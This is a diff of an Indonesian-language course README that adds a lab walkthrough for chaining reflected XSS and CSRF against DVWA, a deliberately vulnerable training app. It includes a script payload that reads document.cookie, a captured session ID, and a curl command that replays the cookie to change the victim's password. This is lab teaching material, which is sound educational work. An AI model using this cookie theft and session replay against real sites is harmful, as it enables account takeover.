@@ -358,7 +358,31 @@ Jika berhasil , maka di msf console akan berubah jadi gambar berikut :
 ![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/31.PNG)
 ### Lesson 10: Cross Site Request Forgery combined with Curl
 
-"Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum."
+1. Login ke DVWA, buka menu CSRF. ISi kolom new password dan kolom confirm new password untuk mendapatkan url seperti ini :
+```
+"http://10.0.1.100/dvwa/vulnerabilities/csrf/?password_new=test123&password_conf=test123&Change=Change#"
+```
+
+2. Buka menu XSS reflected. Ketikkan perintah berikut :
+```
+<script>alert(document.cookie)</script>
+```
+
+3. AKan muncul alert box, kopi isi dari aler box tersebut. ISinya akan terlihat seperti di bawah ini :
+```
+security=low; PHPSESSID=3juclcme0enmmhns9t36mi4ij0
+```
+
+4. Buka terminal, ketikkan perintah berikut secara berurutan :
+```
+curl --cookie "security=low; PHPSESSID=3juclcme0enmmhns9t36mi4ij0" --location "http://10.0.1.100/dvwa/vulnerabilities/csrf/?password_new=password&password_conf=password&Change=Change#" | grep "Password Changed" | tee curl.txt
+```
+Ket = isi cookie dan location diisi sesuai dengan langkah 1 dan 3
+
+![alt text](https://github.com/hendradn/pksj2017/blob/master/FP/Screenshoot/32.PNG)
+
+5. Coba login ke DVWA dengan password yang dirubah. Jika berhasil, sukses
+
 
 # CUCKOO
 ## Instalasi
